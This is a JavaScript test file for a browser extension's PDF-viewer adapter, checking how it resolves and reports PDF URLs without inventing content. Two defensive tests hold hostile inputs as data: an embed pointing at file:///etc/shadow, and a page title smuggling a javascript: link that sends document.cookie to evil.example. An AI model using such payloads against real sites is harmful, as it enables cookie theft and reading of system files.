// PDF-viewer adapter (CLIP-10).
//
// The honest case. When the tab is a PDF, the HTML is an <embed> and nothing
// else, and the bytes live in a plugin no extension script can reach. The
// adapter's job is to make sure the envelope records *which file* the real
// artifact is, so the receiver can go and get it — and to say plainly that it
// did not fetch it, rather than shipping an empty page as if it were content.

import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { loadExtensionScripts } from "../test_helpers.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const fixture = (name) => readFileSync(join(HERE, "fixtures", name), "utf8");

const g = loadExtensionScripts([
  "domlite.js",
  "markdown.js",
  "adapters/util.js",
  "adapters/registry.js",
  "adapters/pdf.js",
]);

const run = (url, html, extra) =>
  g.MonoAdapters.run(Object.assign({ url, tree: g.MonoDomLite.parse(html), baseUrl: url, title: "t" }, extra));

const PAPER = "https://arxiv.org/pdf/2403.00219v2.pdf";

test("a .pdf URL is claimed whatever the markup says", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
  const bare = g.MonoDomLite.parse("<html><body></body></html>");

  assert.ok(ad.match({ url: PAPER, tree: bare }));
  assert.ok(ad.match({ url: "https://x.test/a.PDF?download=1", tree: bare }));
  assert.ok(ad.match({ url: "https://x.test/report", tree: bare, contentType: "application/pdf" }));
  assert.equal(ad.match({ url: "https://x.test/pdf-guide", tree: bare }), false, "a path that merely says pdf is not one");
  assert.equal(ad.match({ url: "https://x.test/a.html", tree: bare }), false);
});

test("Chrome's viewer shell is recognized by its embed, not by the URL", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
  const tree = g.MonoDomLite.parse(fixture("pdf_viewer.html"));
  assert.ok(ad.match({ url: "https://files.example/handout", tree }));
});

test("the viewer shell records the PDF as the real artifact and fakes nothing", () => {
  const out = run(PAPER, fixture("pdf_viewer.html"));

  assert.equal(out.adapter, "pdf");
  assert.equal(out.meta.resolvedPdfUrl, PAPER);
  assert.equal(out.meta.isPdf, true);
  assert.equal(out.meta.pdfFetched, false);

  // No prose is invented: the body is a pointer, and it says so.
  assert.match(out.markdown, /\[.*\]\(https:\/\/arxiv\.org\/pdf\/2403\.00219v2\.pdf\)/);
  assert.match(out.markdown, /not been extracted/i);
  assert.ok(
    out.warnings.some((w) => /cannot read the bytes/i.test(w)),
    `expected an explicit "did not fetch" warning, got ${JSON.stringify(out.warnings)}`
  );
});

test("a wrapper page's embedded PDF is resolved to an absolute URL", () => {
  const out = run("https://coastal.example/papers/12", fixture("pdf_embedded.html"));

  assert.equal(out.meta.resolvedPdfUrl, "https://coastal.example/files/working-paper-12.pdf");
  assert.equal(out.title, "Coastal Reanalysis Working Paper 12");
  // The fragment is viewer state, not part of the file's address.
  assert.doesNotMatch(out.meta.resolvedPdfUrl, /#/);
});

test("the wrapper page's own prose is kept alongside the pointer", () => {
  const out = run("https://coastal.example/papers/12", fixture("pdf_embedded.html"));
  assert.match(out.markdown, /# Coastal Reanalysis Working Paper 12/);
  assert.match(out.markdown, /working-paper-12\.pdf/);
});

test("an HTML page with no PDF anywhere in it is not claimed", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
  const tree = g.MonoDomLite.parse("<html><body><p>Just a page.</p></body></html>");
  assert.equal(ad.match({ url: "https://x.test/page", tree }), false);
});

test("an article that merely links to a PDF keeps its own text", () => {
  // The failure this guards against is silent and total: the adapter claims
  // the page, and readable.md becomes "the real artifact is a PDF" instead of
  // the article that was actually on screen.
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
  const tree = g.MonoDomLite.parse(fixture("pdf_linked.html"));
  const url = "https://coastal.example/notes/what-the-keepers-wrote-down";

  assert.equal(ad.match({ url, tree }), false, "a link in the body is not a PDF page");
  assert.equal(run(url, fixture("pdf_linked.html")), null, "so the generic pipeline gets the page");
});

test("a download link next to a real embed does not change what is resolved", () => {
  // pdf_embedded.html has both an <iframe> of the file and a download <a>.
  // The embed is the signal; the link is decoration.
  const out = run("https://coastal.example/papers/12", fixture("pdf_embedded.html"));
  assert.equal(out.meta.resolvedPdfUrl, "https://coastal.example/files/working-paper-12.pdf");
});

test("a PDF pointer is only ever an http(s) URL", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
  const html = `<html><body><embed type="application/pdf" src="file:///etc/shadow"></body></html>`;
  const tree = g.MonoDomLite.parse(html);

  assert.equal(ad.match({ url: "https://x.test/viewer", tree }), false, "a file:// embed is not a capture target");
  assert.equal(run("https://x.test/viewer", html), null);

  // And the same through the tab's own URL.
  assert.equal(ad.match({ url: "file:///etc/shadow.pdf", tree: g.MonoDomLite.parse("<html><body></body></html>") }), false);
});

test("a filename that is not valid percent-encoding does not throw", () => {
  const url = "https://files.example/%ZZ%E0%A4%A.pdf";
  const out = run(url, "<html><body></body></html>", { contentType: "application/pdf" });

  assert.equal(out.adapter, "pdf");
  assert.equal(out.meta.resolvedPdfUrl, url);
  assert.ok(out.title, "a title is still produced from the undecodable name");
});

test("markdown syntax in a wrapper page's title cannot forge a link", () => {
  const html = `<html><head>
    <meta property="og:title" content="Report](javascript:fetch('//evil.example/'+document.cookie)) x">
    </head><body>
    <embed type="application/pdf" src="/files/report.pdf">
    </body></html>`;
  const out = run("https://x.test/viewer", html);

  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
});
